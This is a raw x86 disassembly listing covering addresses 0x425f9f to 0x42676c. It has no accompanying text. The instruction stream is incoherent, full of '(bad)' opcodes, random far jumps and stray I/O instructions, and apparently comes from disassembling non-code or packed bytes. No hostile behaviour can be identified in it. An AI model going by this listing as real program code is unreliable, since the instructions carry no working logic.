  425f9f:	outs   dx,DWORD PTR ds:[esi]
  425fa0:	cld    
  425fa1:	mov    ah,0x36
  425fa3:	popa   
  425fa4:	adc    BYTE PTR ds:0xeaafb6d9,ch
  425faa:	pop    esp
  425fab:	(bad)  
  425fac:	nop
  425fad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425fae:	xor    dh,BYTE PTR [edx-0x43]
  425fb1:	dec    ecx
  425fb2:	(bad)  
  425fb3:	lea    edx,[ecx]
  425fb5:	mov    edx,0x5c568826
  425fba:	pop    es
  425fbb:	lock mov esi,0x5ab66eab
  425fc1:	leave  
  425fc2:	mov    BYTE PTR [edx+eax*4],bh
  425fc5:	or     eax,0x3d1d512a
  425fca:	sbb    eax,0xc19ce145
  425fcf:	outs   dx,BYTE PTR ds:[esi]
  425fd0:	or     dl,BYTE PTR ds:0x4ca9ff4c
  425fd6:	fs mov dl,0x4f
  425fd9:	and    eax,0xddec9883
  425fde:	or     DWORD PTR [ebp-0x6e],esp
  425fe1:	loop   0x425f9a
  425fe3:	push   edi
  425fe4:	fs pop ss
  425fe6:	add    BYTE PTR [eax],bl
  425fe8:	pop    ebp
  425fe9:	sahf   
  425fea:	fsubr  st,st(7)
  425fec:	nop
  425fed:	and    al,0xd0
  425fef:	jg     0x426009
  425ff1:	pop    edx
  425ff2:	imul   ecx,DWORD PTR [ebx+ecx*1],0x35205a2d
  425ff9:	mov    al,ds:0x781f8bdb
  425ffe:	or     esp,DWORD PTR ds:0xd561a932
  426004:	dec    ebx
  426005:	popf   
  426006:	(bad)  
  426007:	(bad)  
  426009:	fcomp  DWORD PTR [ebx+0x103f6fcd]
  42600f:	pop    esp
  426010:	xchg   esi,eax
  426011:	pop    es
  426012:	fld    DWORD PTR [edx+0x42]
  426015:	inc    esp
  426016:	mov    bl,BYTE PTR [edi+0x5a]
  426019:	icebp  
  42601a:	ja     0x426076
  42601c:	fstp   DWORD PTR [ecx+0x73]
  42601f:	inc    ecx
  426020:	and    esp,DWORD PTR [ecx]
  426022:	lds    ebx,FWORD PTR [edi]
  426024:	jmp    0x425fd7
  426026:	adc    BYTE PTR [esi-0xd],al
  426029:	jmp    0x426069
  42602b:	cmp    bh,BYTE PTR [ebx]
  42602d:	outs   dx,DWORD PTR ds:[esi]
  42602e:	das    
  42602f:	test   al,0xb5
  426031:	mov    ebp,DWORD PTR [ebx+ecx*1-0x1e]
  426035:	stos   DWORD PTR es:[edi],eax
  426036:	pop    es
  426037:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426038:	xchg   ecx,eax
  426039:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42603a:	ret    0x5a26
  42603d:	add    BYTE PTR [eax+0x775829e5],dl
  426043:	das    
  426044:	jne    0x42609c
  426046:	fdivp  st(4),st
  426048:	and    eax,DWORD PTR ds:0xfb
	...
  42606a:	inc    edx
  42606b:	inc    esp
  42606c:	inc    ebp
  42606d:	pop    eax
  42606e:	inc    edi
  42606f:	pop    ecx
  426070:	pop    edi
  426071:	pop    esi
  426072:	mov    bl,0x51
  426074:	push   eax
  426075:	mov    cl,0xe2
  426077:	test   al,0xfd
  426079:	retf   0xec69
  42607c:	add    DWORD PTR [eax],eax
  42607e:	mov    DWORD PTR [esi],eax
  426080:	add    BYTE PTR [eax],al
  426082:	mov    eax,0xf9454021
  426087:	in     eax,dx
  426088:	das    
  426089:	rcl    DWORD PTR ds:0xfe9503c5,cl
  42608f:	adc    BYTE PTR [edi+0x6f620c59],ch
  426095:	xor    dl,BYTE PTR [ecx-0x53f98b40]
  42609b:	sar    BYTE PTR [ebp-0x49],cl
  42609e:	imul   ebp,DWORD PTR [edx+0x30d7b22e],0xffffffd2
  4260a5:	push   es
  4260a6:	shr    DWORD PTR [ebp-0x51],1
  4260a9:	push   ecx
  4260aa:	ss cmp DWORD PTR cs:[esi+0xd4ed57b],eax
  4260b2:	inc    ecx
  4260b3:	scas   eax,DWORD PTR es:[edi]
  4260b4:	add    al,0xea
  4260b6:	cmp    eax,0xc22cfe81
  4260bb:	js     0x4260b4
  4260bd:	shl    ecx,0x72
  4260c0:	pop    ds
  4260c1:	cmc    
  4260c2:	or     esi,DWORD PTR [esi-0x69f56816]
  4260c8:	out    0xf9,eax
  4260ca:	push   cs
  4260cb:	and    al,0x9
  4260cd:	ja     0x4260f6
  4260cf:	add    ah,BYTE PTR [edx]
  4260d1:	lock cdq 
  4260d3:	popa   
  4260d4:	out    dx,eax
  4260d5:	or     DWORD PTR ds:0x4f6fb612,esp
  4260db:	pop    esp
  4260dc:	das    
  4260dd:	test   eax,0xefd584da
  4260e2:	xchg   ebp,eax
  4260e4:	or     DWORD PTR [ecx-0x48b0f801],edi
  4260ea:	pop    edx
  4260eb:	or     edx,0x8985985d
  4260f1:	push   cs
  4260f2:	mov    dh,BYTE PTR [eax-0xc265a35]
  4260f8:	fs (bad) 
  4260fa:	cmp    DWORD PTR [edi-0x33c262e],edi
  426100:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426101:	pop    ebp
  426102:	dec    edi
  426103:	sbb    esp,DWORD PTR [edx+ecx*4-0x7e43a59b]
  42610a:	or     edi,DWORD PTR [ebx]
  42610c:	pop    ebp
  42610d:	les    esi,FWORD PTR [edi-0x71]
  426110:	xor    esp,edx
  426112:	mov    al,0xf2
  426114:	push   ecx
  426115:	out    dx,eax
  426116:	fwait
  426117:	sub    DWORD PTR es:[ecx-0x3a433d45],edx
  42611e:	pop    ds
  42611f:	xchg   edx,eax
  426120:	clc    
  426121:	push   ebp
  426122:	stos   BYTE PTR es:[edi],al
  426123:	sbb    esp,DWORD PTR [eax+edx*8-0x6a]
  426127:	std    
  426128:	xor    WORD PTR [edi-0x54d01d58],cx
  42612f:	add    BYTE PTR [edx-0x58259685],bl
  426135:	mov    ah,0x1b
  426137:	(bad)  
  426138:	mov    eax,ds:0x991fcb5d
  42613d:	call   0x332ebdae
  426142:	aaa    
  426143:	inc    ecx
  426144:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426145:	in     al,0x5
  426147:	or     ecx,DWORD PTR [eax]
  426149:	jl     0x426176
  42614b:	mov    BYTE PTR [ebp-0x48f7068a],dh
  426151:	scas   al,BYTE PTR es:[edi]
  426152:	and    esp,eax
  426154:	pop    esi
  426155:	enter  0x3540,0x1d
  426159:	or     al,BYTE PTR [eax]
  42615b:	xor    al,0xc
  42615d:	cmp    ah,BYTE PTR [ecx]
  42615f:	pusha  
  426160:	inc    edx
  426161:	pop    ecx
  426162:	call   0x8a407193
  426167:	sub    dh,BYTE PTR ds:0xd1239aa4
  42616d:	sub    esi,ecx
  42616f:	sub    dl,BYTE PTR [edi]
  426171:	(bad)  
  426172:	push   eax
  426173:	test   eax,0x2167bd77
  426178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426179:	mov    ecx,0x20f1d3a3
  42617e:	pop    ds
  42617f:	xchg   BYTE PTR gs:[ecx],cl
  426182:	(bad)  
  426183:	rcr    DWORD PTR [edi],cl
  426185:	shl    BYTE PTR cs:[ecx+0x31],cl
  426189:	sub    BYTE PTR [ebp+0x68],al
  42618c:	or     esi,esp
  42618e:	xchg   esp,eax
  42618f:	icebp  
  426190:	inc    edi
  426191:	icebp  
  426192:	in     eax,0xb9
  426194:	fadd   DWORD PTR ds:0x6aaf6e31
  42619a:	jmp    0x6390:0xad5572f7
  4261a1:	adc    esi,eax
  4261a3:	jae    0x42619e
  4261a5:	jnp    0x4261d6
  4261a7:	dec    esi
  4261a8:	punpcklwd mm7,DWORD PTR [ecx-0x67]
  4261ac:	cmp    BYTE PTR [ebx],0xaf
  4261af:	call   0x956e:0x4eba8676
  4261b6:	or     bh,BYTE PTR [edi-0x6e]
  4261b9:	clc    
  4261ba:	pop    ecx
  4261bb:	call   0xbece:0xb136b0a2
  4261c2:	jns    0x4261b5
  4261c4:	and    al,0x46
  4261c6:	loope  0x42623e
  4261c8:	xchg   DWORD PTR [ebp-0x2f1ec921],eax
  4261ce:	dec    ebx
  4261cf:	lods   eax,DWORD PTR ds:[esi]
  4261d0:	loop   0x4261de
  4261d2:	cmp    DWORD PTR [esi-0x18c83c57],esp
  4261d8:	int3   
  4261d9:	fs xchg esp,eax
  4261db:	pop    es
  4261dc:	jecxz  0x426184
  4261de:	imul   esi,esi,0xffffff81
  4261e1:	in     al,0x48
  4261e3:	rcr    bl,cl
  4261e5:	xchg   esi,eax
  4261e6:	leave  
  4261e7:	loopne 0x426211
  4261e9:	sub    al,0x2d
  4261eb:	xchg   BYTE PTR [ebx+0x2e1752e8],ch
  4261f1:	hlt    
  4261f2:	cmp    al,0xe3
  4261f4:	retf   0x2547
  4261f7:	clc    
  4261f8:	pop    ss
  4261f9:	jmp    FWORD PTR [ebp-0x3fdc0917]
  4261ff:	or     eax,0x93fff76e
  426204:	cli    
  426205:	dec    edx
  426206:	and    eax,0x6a6e1899
  42620b:	and    eax,0xaa9baaca
  426210:	repnz and al,0x55
  426213:	ret    
  426214:	adc    eax,0x370e85f5
  426219:	inc    edi
  42621a:	sbb    al,0xc
  42621c:	sbb    al,0x34
  42621e:	stos   DWORD PTR es:[edi],eax
  42621f:	sar    BYTE PTR [ebx+0x49],0xda
  426223:	ds int 0xf9
  426226:	sub    cl,cl
  426228:	sub    DWORD PTR [eax-0x35b1453d],0xa4f14dd2
  426232:	daa    
  426233:	es jge 0x4261f9
  426236:	mov    ch,0xa0
  426238:	push   ebp
  426239:	dec    esi
  42623a:	xchg   ebp,eax
  42623b:	data16 (bad) 
  42623d:	outs   dx,DWORD PTR ds:[esi]
  42623e:	xor    bh,BYTE PTR [esi-0xb]
  426241:	push   cs
  426242:	mov    BYTE PTR [edi],dl
  426244:	cmp    DWORD PTR [ecx-0x1d],0xf1d381b2
  42624b:	ror    DWORD PTR [eax-0x40dd129d],cl
  426251:	cld    
  426252:	cld    
  426253:	xchg   ebp,eax
  426254:	jns    0x4261fc
  426256:	xor    esp,DWORD PTR ds:0x85efcafc
  42625c:	(bad)
  42625f:	add    DWORD PTR [ebp+0x4a96b227],edx
  426265:	clc    
  426266:	in     eax,0x4d
  426268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426269:	mov    DWORD PTR [esi+0x18ca7a54],ebp
  42626f:	add    eax,0x733fba95
  426274:	(bad)  
  426276:	mov    esi,0xe421041f
  42627b:	adc    al,0xed
  42627d:	enter  0x6cf3,0xed
  426281:	or     eax,0xb498093e
  426286:	stos   DWORD PTR es:[edi],eax
  426287:	imul   bx,WORD PTR [ecx-0x4f],0xacd
  42628d:	mov    WORD PTR es:[eax],fs
  426290:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  426292:	or     dl,ah
  426294:	outs   dx,DWORD PTR ds:[esi]
  426295:	stos   DWORD PTR es:[edi],eax
  426296:	mov    cs,WORD PTR [edx-0x1e021ff]
  42629c:	pop    eax
  42629d:	les    eax,FWORD PTR [esi-0x10810b4]
  4262a3:	push   edx
  4262a4:	(bad)  
  4262a5:	mov    bl,0xc1
  4262a7:	push   es
  4262a8:	sahf   
  4262a9:	jmp    FWORD PTR [ebx+0x17d84e90]
  4262af:	bound  esp,QWORD PTR [edx-0x24]
  4262b2:	jae    0x4262f6
  4262b4:	dec    edx
  4262b5:	or     ecx,ecx
  4262b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4262b8:	icebp  
  4262b9:	push   es
  4262ba:	inc    ebx
  4262bb:	(bad)  
  4262bc:	std    
  4262bd:	xchg   ebp,eax
  4262be:	push   ebp
  4262bf:	xchg   ebx,eax
  4262c0:	mov    BYTE PTR [esi-0x2950291d],0x7c
  4262c7:	shl    DWORD PTR [ebx],1
  4262c9:	ror    BYTE PTR [edi-0x7b],cl
  4262cc:	retf   0x4903
  4262cf:	xchg   edi,eax
  4262d0:	jl     0x426303
  4262d2:	mov    dh,0x5c
  4262d4:	pop    esi
  4262d5:	pop    edx
  4262d6:	fcomp  QWORD PTR [ebx+eiz*4]
  4262d9:	out    dx,al
  4262da:	stos   BYTE PTR es:[edi],al
  4262db:	or     ebx,esp
  4262dd:	test   al,dh
  4262df:	mov    dl,0x2d
  4262e1:	rcl    DWORD PTR [edx-0x14],0xdd
  4262e5:	imul   esi,DWORD PTR [ecx],0xffffffc4
  4262e8:	pop    eax
  4262e9:	mov    ecx,0x6cb2dfb2
  4262ee:	imul   esi,DWORD PTR [edx-0x4b],0xfffffffd
  4262f2:	xor    al,0x60
  4262f4:	(bad)  
  4262f5:	and    eax,0x98f92b2a
  4262fa:	pusha  
  4262fb:	into   
  4262fc:	dec    ecx
  4262fd:	lea    ebp,[ebx+0x40ae4bb2]
  426303:	call   0x3a32e371
  426308:	mov    al,ds:0x9fdb39d9
  42630d:	jle    0x4262eb
  42630f:	gs inc edi
  426311:	or     al,0x63
  426313:	push   edi
  426314:	popa   
  426315:	fwait
  426316:	neg    bh
  426318:	mov    ch,0xf
  42631a:	jns    0x42634c
  42631c:	sub    eax,0x9a2063ac
  426321:	lods   al,BYTE PTR ds:[esi]
  426322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426323:	(bad)  
  426324:	xchg   edi,eax
  426325:	adc    dl,BYTE PTR [ecx]
  426327:	sbb    eax,0x6b7f0704
  42632c:	mov    edx,0x220c99a
  426331:	mov    eax,ds:0x32986c9
  426336:	aad    0x10
  426338:	xor    DWORD PTR [esi],esi
  42633a:	test   dl,ch
  42633c:	dec    esp
  42633d:	fcomi  st,st(1)
  42633f:	cmp    dl,bl
  426341:	dec    eax
  426342:	fild   QWORD PTR [edx-0x76e27447]
  426348:	aas    
  426349:	gs in  eax,0xf6
  42634c:	in     eax,0x52
  42634e:	xchg   edi,eax
  42634f:	jnp    0x42633b
  426351:	dec    edx
  426352:	in     eax,0x6c
  426354:	test   DWORD PTR [eax],ebx
  426356:	xchg   ebx,eax
  426357:	push   0xf5541f51
  42635c:	push   ebx
  42635d:	fwait
  42635e:	mov    bl,0xf2
  426360:	jne    0x42638b
  426362:	aad    0x95
  426364:	(bad)
  426367:	retf   0xbd87
  42636a:	or     al,0x29
  42636c:	jge    0x426373
  42636e:	inc    ebp
  42636f:	bnd jmp 0x426313
  426372:	daa    
  426373:	inc    edx
  426374:	pop    es
  426375:	sbb    BYTE PTR [edi],cl
  426377:	test   al,0x72
  426379:	lahf   
  42637a:	jno    0x4263ed
  42637c:	addr16 shrd ebx,ebx,cl
  426380:	or     dh,BYTE PTR [esi]
  426382:	sub    al,0x40
  426384:	dec    edx
  426385:	push   eax
  426386:	push   ebx
  426387:	addr16 (bad) 
  426389:	dec    eax
  42638a:	add    eax,0xfcc8d48
  42638f:	xchg   ebp,eax
  426390:	jb     0x4263c1
  426392:	and    DWORD PTR [esi-0x4b],esp
  426395:	daa    
  426396:	fxch   st(0)
  426398:	cwde   
  426399:	repnz fwait
  42639b:	(bad)  
  42639c:	imul   esp,DWORD PTR [ebx+0x5b4d3f8a],0x235907b2
  4263a6:	fwait
  4263a7:	jns    0x4263a2
  4263a9:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4263ab:	jecxz  0x4263e1
  4263ad:	inc    edx
  4263af:	in     eax,0x74
  4263b1:	pop    esp
  4263b2:	aas    
  4263b3:	sti    
  4263b4:	aad    0x20
  4263b6:	std    
  4263b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263b8:	cwde   
  4263b9:	mov    ch,0x17
  4263bb:	jle    0x42635c
  4263bd:	shr    BYTE PTR [edi-0x3],cl
  4263c0:	lock scas eax,DWORD PTR es:[edi]
  4263c2:	jmp    0x8504:0xad47a1b4
  4263c9:	mov    eax,ds:0x3eb43dd5
  4263ce:	sub    DWORD PTR [eax],ebp
  4263d0:	push   ds
  4263d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263d3:	inc    ebp
  4263d4:	mov    ebp,0x2865c7a5
  4263d9:	mov    eax,0xa0f20f23
  4263de:	add    ch,BYTE PTR [edx-0x17]
  4263e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263e2:	dec    edi
  4263e3:	mov    esi,0xee6bfc75
  4263e8:	fs inc ebp
  4263ea:	xchg   edx,eax
  4263eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4263ec:	mov    BYTE PTR [ecx+0x14],bl
  4263ef:	jp     0x426394
  4263f1:	xchg   ebx,eax
  4263f2:	adc    dl,BYTE PTR [edx-0x15]
  4263f5:	mov    ah,0xa1
  4263f7:	cmc    
  4263f8:	dec    ebx
  4263f9:	iret   
  4263fa:	xor    cl,BYTE PTR [esi-0x4238b88c]
  426400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426401:	dec    edx
  426402:	adc    eax,0xa49d0122
  426407:	cmp    edx,DWORD PTR [edi+0x7008978c]
  42640d:	cmp    eax,0x2c23dfe9
  426412:	pop    edx
  426413:	or     al,0x6d
  426415:	jns    0x4263bb
  426417:	jge    0x426435
  426419:	mov    bh,0x48
  42641b:	or     BYTE PTR [edi+0x21c72939],0xe8
  426422:	cmc    
  426423:	fsub   DWORD PTR [esi+0x63dee8c9]
  426429:	mov    ecx,0x1036318a
  42642e:	pop    ecx
  42642f:	jae    0x426402
  426431:	leave  
  426432:	(bad)  
  426434:	stos   DWORD PTR es:[edi],eax
  426435:	test   BYTE PTR [ecx+0xa],ch
  426438:	test   eax,0x19bd428e
  42643d:	sbb    al,0x78
  42643f:	in     al,0x30
  426441:	mov    cl,0x93
  426443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426444:	mov    DWORD PTR ds:0xca773fb6,esp
  42644a:	jno    0x42642d
  42644c:	xor    dh,dh
  42644e:	xor    eax,0x77bae9f5
  426453:	popa   
  426454:	aam    0x46
  426456:	test   al,0xf0
  426458:	loope  0x4263ff
  42645a:	xor    al,0x76
  42645c:	jg     0x426413
  42645e:	cmp    eax,0xcf65cb42
  426463:	fwait
  426464:	hlt    
  426465:	xor    DWORD PTR [ebp+edx*4+0x3c40fb6e],ecx
  42646c:	loop   0x42646d
  42646e:	test   al,0xd5
  426470:	stos   DWORD PTR es:[edi],eax
  426471:	push   ss
  426472:	sub    edx,eax
  426474:	xor    BYTE PTR [esi+ebx*4+0x33],dl
  426478:	xchg   esi,ebp
  42647a:	mov    dl,BYTE PTR [eax+0x72]
  42647d:	loopne 0x4264fc
  42647f:	inc    esi
  426480:	or     ch,BYTE PTR [ebx+0x56f4d870]
  426486:	pop    ebx
  426487:	fdivr  DWORD PTR [ebx+0x12]
  42648a:	dec    esi
  42648b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42648c:	in     eax,dx
  42648d:	rcl    ah,1
  42648f:	cmp    eax,0x3f3ae68e
  426494:	xchg   edi,eax
  426495:	out    0x4e,al
  426497:	out    dx,al
  426498:	xchg   eax,ecx
  42649a:	xor    eax,0x3d134aef
  42649f:	push   ebp
  4264a0:	sub    DWORD PTR [ecx],0x79f5f4a0
  4264a6:	cld    
  4264a7:	xor    DWORD PTR [ebx],esi
  4264a9:	jno    0x4264ef
  4264ab:	into   
  4264ac:	in     eax,dx
  4264ad:	inc    esp
  4264ae:	xor    al,0x2e
  4264b0:	popf   
  4264b1:	sub    eax,0xfabd2ab2
  4264b6:	dec    DWORD PTR [eax-0xb]
  4264b9:	ins    BYTE PTR es:[edi],dx
  4264ba:	lods   al,BYTE PTR ds:[esi]
  4264bb:	fs in  al,dx
  4264bd:	enter  0x5d39,0x64
  4264c1:	push   edi
  4264c2:	add    DWORD PTR [esi+ebx*8],esi
  4264c5:	or     bl,BYTE PTR [edx+ecx*1+0x68578c20]
  4264cc:	test   al,0x99
  4264ce:	iret   
  4264cf:	stc    
  4264d0:	(bad)  {k4}{z}
  4264d5:	mov    ah,0x27
  4264d7:	xchg   edx,eax
  4264d8:	mov    DWORD PTR [esp+ecx*8+0x5b],esp
  4264dc:	pop    edx
  4264dd:	fs sti 
  4264df:	jb     0x42655b
  4264e1:	jb     0x4264e3
  4264e3:	scas   eax,DWORD PTR es:[edi]
  4264e4:	imul   esi,DWORD PTR [edi],0x9944df43
  4264ea:	push   ebp
  4264eb:	push   ecx
  4264ec:	jmp    0x4264ac
  4264ee:	or     ah,BYTE PTR [eax+edx*4+0x292abf33]
  4264f5:	fidiv  WORD PTR [esi-0x38]
  4264f8:	xchg   edi,eax
  4264f9:	fsub   QWORD PTR [ecx-0x75130f4f]
  4264ff:	mov    esi,0x1456869a
  426504:	mov    bh,0x3f
  426506:	test   eax,0x278c68a7
  42650b:	or     DWORD PTR [esi-0x54],esi
  42650e:	fcom   QWORD PTR [edx+0x3e]
  426511:	ins    BYTE PTR es:[edi],dx
  426512:	or     al,0xb9
  426514:	xchg   edx,eax
  426515:	int    0xbd
  426517:	adc    BYTE PTR [ebx],dh
  426519:	inc    esp
  42651a:	(bad)  
  42651b:	inc    ecx
  42651c:	dec    ecx
  42651d:	add    eax,0x6933bdad
  426522:	jbe    0x4264b1
  426524:	push   edi
  426525:	aam    0x67
  426527:	aad    0x16
  426529:	jns    0x426548
  42652b:	cmp    dl,BYTE PTR [ecx]
  42652d:	or     ebx,DWORD PTR [eax]
  42652f:	pop    ds
  426530:	(bad)  
  426531:	fadd   QWORD PTR [eax+0x5b]
  426534:	sbb    al,0xdd
  426536:	imul   edi,DWORD PTR [eax],0xfffffffa
  426539:	ret    
  42653a:	cmp    al,0xaa
  42653c:	test   bl,cl
  42653e:	pop    ebx
  42653f:	in     al,dx
  426540:	dec    eax
  426541:	cdq    
  426542:	enter  0xfcf,0x91
  426546:	dec    edi
  426547:	dec    ebx
  426548:	mov    BYTE PTR ds:0xcceba4f,dl
  42654e:	xor    esp,DWORD PTR [ecx+0x1d]
  426551:	loopne 0x42650b
  426553:	xchg   edi,eax
  426554:	pop    ss
  426555:	jb     0x426599
  426557:	in     eax,dx
  426558:	inc    ebp
  426559:	out    0x46,al
  42655b:	jmp    0x6363:0x5922c45f
  426562:	test   al,0xc2
  426564:	scas   eax,DWORD PTR es:[edi]
  426565:	(bad)
  426568:	pop    ds
  426569:	or     eax,0xe53704c7
  42656e:	push   edi
  42656f:	repnz push ebx
  426571:	pop    edx
  426572:	mul    BYTE PTR [edi]
  426574:	sub    DWORD PTR [esi+0x37c92d4d],ebp
  42657a:	(bad)  
  42657b:	sbb    eax,0x3407a078
  426580:	add    bl,cl
  426582:	out    dx,al
  426583:	sti    
  426584:	add    eax,DWORD PTR [edx+0x16]
  426587:	jge    0x4265b3
  426589:	fdivp  st(2),st
  42658b:	test   al,0xf7
  42658d:	lea    ecx,[ebp*1-0x3768fbc8]
  426594:	inc    edi
  426595:	outs   dx,BYTE PTR ds:[esi]
  426596:	pop    es
  426597:	inc    esp
  426598:	rcl    ebp,cl
  42659a:	fmul   DWORD PTR [esi+0x34]
  42659d:	ret    0x4397
  4265a0:	xor    dh,bl
  4265a2:	jb     0x4265e5
  4265a4:	repnz call 0x2437:0x32696629
  4265ac:	ins    DWORD PTR es:[edi],dx
  4265ad:	fwait
  4265ae:	xor    DWORD PTR [esi+0x64c20b3d],esi
  4265b4:	mov    al,0x20
  4265b6:	sar    DWORD PTR [ecx+ebx*8+0x4e44b0db],cl
  4265bd:	dec    esp
  4265be:	mov    esp,0xf8028570
  4265c3:	dec    esp
  4265c4:	dec    ebp
  4265c5:	ficom  WORD PTR [edx-0x53]
  4265c8:	test   DWORD PTR [esi+0x1],ecx
  4265cb:	addr16 push 0x3d
  4265ce:	lahf   
  4265cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4265d0:	repnz cwde 
  4265d2:	push   edx
  4265d3:	xchg   edx,eax
  4265d4:	(bad)
  4265d7:	stos   DWORD PTR es:[edi],eax
  4265d8:	push   ebp
  4265d9:	inc    ebp
  4265da:	test   al,0xaf
  4265dc:	xchg   esi,eax
  4265dd:	inc    esi
  4265de:	pushf  
  4265df:	std    
  4265e0:	xor    al,0xbc
  4265e2:	shl    DWORD PTR fs:[ebx],0x96
  4265e6:	dec    ebx
  4265e7:	mov    eax,DWORD PTR [esi]
  4265e9:	mov    cl,0x41
  4265eb:	lea    ebx,[edx-0x10c10e8d]
  4265f1:	ds hlt 
  4265f3:	inc    edx
  4265f4:	test   al,0xd5
  4265f6:	rcl    BYTE PTR [edx+0x6b9b5262],cl
  4265fc:	ror    BYTE PTR es:[edi+ecx*1+0x60],1
  426601:	outs   dx,DWORD PTR ds:[esi]
  426602:	mov    dh,0x88
  426604:	clc    
  426605:	jge    0x426595
  426607:	jmp    0x42666c
  426609:	mov    ecx,ebp
  42660b:	ins    DWORD PTR es:[edi],dx
  42660c:	mov    esp,cs
  42660e:	jg     0x42667e
  426610:	nop
  426611:	cmc    
  426612:	neg    BYTE PTR [edx+0x4b]
  426615:	cmp    BYTE PTR [ebx],ah
  426617:	outs   dx,DWORD PTR ds:[esi]
  426618:	(bad)  
  426619:	hlt    
  42661a:	sub    DWORD PTR [ebx-0xc05b4c2],eax
  426620:	or     eax,DWORD PTR [esi-0x6868d659]
  426626:	fistp  DWORD PTR [edx-0x53]
  426629:	jecxz  0x4265e4
  42662b:	xor    esi,DWORD PTR [ecx-0x5c]
  42662e:	xchg   esi,eax
  42662f:	out    0x1c,al
  426631:	in     eax,dx
  426632:	fild   WORD PTR [ebx+edx*2]
  426635:	xor    al,al
  426637:	(bad)  [ebx-0x592bdd5a]
  42663d:	out    dx,eax
  42663e:	sbb    DWORD PTR [esi-0x33],ecx
  426641:	mov    cl,0xb3
  426643:	repnz mov esi,0xaa539191
  426649:	cmp    ebx,DWORD PTR [edi+0x39]
  42664c:	mov    edx,0x8562c85f
  426651:	pop    edi
  426652:	aas    
  426653:	icebp  
  426654:	mov    ah,0xee
  426656:	inc    edi
  426657:	jg     0x4266cd
  426659:	gs jns 0x4265fb
  42665c:	push   edi
  42665d:	cmc    
  42665e:	mov    ds:0x164904c7,al
  426663:	push   es
  426664:	xchg   ebp,eax
  426665:	xor    ah,0x5a
  426668:	fnstsw WORD PTR [ecx-0x5b]
  42666b:	mov    ecx,0x82ca5c04
  426670:	rcr    DWORD PTR [ebx],1
  426672:	sbb    esp,DWORD PTR [ebx-0x72]
  426675:	enter  0xf5bb,0xfc
  426679:	xlat   BYTE PTR ds:[ebx]
  42667a:	stc    
  42667b:	jo     0x426623
  42667d:	push   esi
  42667e:	adc    BYTE PTR [edi+0x4a8bc9a0],ah
  426684:	cs jne 0x4266a6
  426687:	dec    edx
  426688:	test   eax,0xab7d3605
  42668d:	pop    esi
  42668e:	test   DWORD PTR [esi+ebx*1],edi
  426691:	push   0x268599c2
  426696:	push   ebx
  426697:	or     si,WORD PTR [esi+0x1928ce28]
  42669e:	dec    eax
  42669f:	rcl    DWORD PTR [edx],cl
  4266a1:	cmp    bh,BYTE PTR [edi-0x18]
  4266a4:	sbb    BYTE PTR ds:0x8a0090d,dh
  4266aa:	jae    0x4266ff
  4266ac:	ret    0x8c70
  4266af:	jb     0x4266dc
  4266b1:	pop    edi
  4266b2:	fdivr  QWORD PTR [esi+0x55518136]
  4266b8:	push   eax
  4266b9:	xchg   ecx,eax
  4266ba:	xchg   ebp,eax
  4266bb:	mov    bh,0xbc
  4266bd:	aas    
  4266be:	jbe    0x4266b8
  4266c0:	and    ecx,edx
  4266c2:	dec    esi
  4266c3:	call   0x1fb9:0x680651be
  4266ca:	sub    DWORD PTR [edi],esp
  4266cc:	xor    al,0xb6
  4266ce:	xor    esp,DWORD PTR [eax-0x5]
  4266d1:	es call 0x98762d4b
  4266d7:	test   BYTE PTR [edx-0x37329afd],0xee
  4266de:	pop    esp
  4266df:	in     eax,dx
  4266e0:	jge    0x42667e
  4266e2:	in     al,0x72
  4266e4:	loopne 0x4266ec
  4266e6:	push   edi
  4266e7:	mov    bh,0x61
  4266e9:	add    DWORD PTR [esi],eax
  4266eb:	fs dec ebx
  4266ed:	jne    0x426673
  4266ef:	pushf  
  4266f0:	test   al,cl
  4266f2:	inc    ebp
  4266f3:	leave  
  4266f4:	xchg   BYTE PTR [ebp+eax*1+0x1c],bh
  4266f8:	xor    edi,DWORD PTR [edi+0xb]
  4266fb:	adc    ebp,DWORD PTR [eax-0x4fd01fdd]
  426701:	xchg   ecx,eax
  426702:	push   esi
  426703:	mov    eax,0x90b69ec2
  426708:	lods   eax,DWORD PTR ds:[esi]
  426709:	xor    DWORD PTR [ebp+0x0],esp
	...
  426727:	add    BYTE PTR [eax],al
  426729:	add    BYTE PTR [ecx+0x55],cl
  42672c:	inc    edx
  42672d:	push   ebx
  42672e:	pop    esi
  42672f:	push   edi
  426730:	pop    ecx
  426731:	pop    edi
  426732:	ss cmc 
  426734:	imul   BYTE PTR [ebx]
  426736:	push   ebp
  426737:	lods   al,BYTE PTR ds:[esi]
  426738:	test   dh,dh
  42673a:	repnz repnz add DWORD PTR [eax],eax
  42673e:	mov    DWORD PTR [esi],eax
  426740:	add    BYTE PTR [eax],al
  426742:	dec    ebx
  426743:	jle    0x4266f6
  426745:	xor    ch,BYTE PTR [edi+edx*2+0x54]
  426749:	ret    0x5755
  42674c:	nop
  42674d:	mov    fs,WORD PTR [esi]
  42674f:	mov    esi,DWORD PTR [ebx]
  426751:	loop   0x426736
  426753:	jl     0x426789
  426755:	sub    edi,esp
  426757:	or     BYTE PTR [eax+0x7748747],bh
  42675d:	cmc    
  42675e:	push   0x59d60e8a
  426763:	scas   al,BYTE PTR es:[edi]
  426764:	cmc    
  426765:	and    BYTE PTR [edx+0x598d9fa1],dl
  42676b:	clc    
  42676c:	ret    0x5f94
